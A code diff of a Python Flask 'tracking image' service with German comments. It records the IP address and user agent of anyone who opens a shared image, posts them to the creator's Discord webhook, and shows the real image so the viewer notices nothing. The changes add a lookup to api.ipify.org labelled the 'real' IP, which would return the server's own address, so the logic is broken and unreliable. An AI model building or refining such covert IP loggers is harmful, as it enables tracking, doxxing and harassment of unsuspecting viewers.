@@ -84,9 +84,11 @@ def track_image():
         # Sende Discord-Benachrichtigung
         try:
             webhook_url = tracking_data['webhook_url']
-            send_discord_notification(webhook_url, visitor_info, tracking_data['id'])
-        except:
-            pass  # Discord-Benachrichtigung ist optional
+            response = send_discord_notification(webhook_url, visitor_info, tracking_data['id'])
+            print(f"Discord response: {response}")
+        except Exception as e:
+            print(f"Discord Fehler: {e}")
+            # Discord-Benachrichtigung ist optional, aber wir loggen den Fehler
         
         # Zeige Tracking-Seite mit echtem Bild
         image_url = tracking_data['image_url']
@@ -150,6 +152,15 @@ def track_image():
 def send_discord_notification(webhook_url, visitor_info, tracking_id):
     """Sendet eine Benachrichtigung an Discord"""
     try:
+        # Hole echte IP-Adresse von externem Service
+        real_ip = "Unbekannt"
+        try:
+            ip_response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5)
+            ip_data = json.loads(ip_response.read().decode())
+            real_ip = ip_data.get('ip', 'Unbekannt')
+        except:
+            pass
+        
         embed = {
             "title": "🔍 Bild wurde angesehen!",
             "description": f"Jemand hat dein Tracking-Bild angesehen",
@@ -157,7 +168,7 @@ def send_discord_notification(webhook_url, visitor_info, tracking_id):
             "fields": [
                 {
                     "name": "🌐 IP-Adresse",
-                    "value": f"```\n{visitor_info['ip']}\n```",
+                    "value": f"```\n{real_ip}\n```",
                     "inline": True
                 },
                 {
@@ -166,8 +177,8 @@ def send_discord_notification(webhook_url, visitor_info, tracking_id):
                     "inline": True
                 },
                 {
-                    "name": "🔗 Tracking-ID",
-                    "value": f"```\n{tracking_id}\n```",
+                    "name": "👤 User-Agent",
+                    "value": f"```\n{visitor_info['user_agent'][:50]}...\n```" if len(visitor_info['user_agent']) > 50 else f"```\n{visitor_info['user_agent']}\n```",
                     "inline": False
                 }
             ],
@@ -192,7 +203,7 @@ def send_discord_notification(webhook_url, visitor_info, tracking_id):
             
     except Exception as e:
         print(f"Fehler beim Senden an Discord: {e}")
-        raise
+        return str(e)
 
 @app.route('/health')
 def health_check():
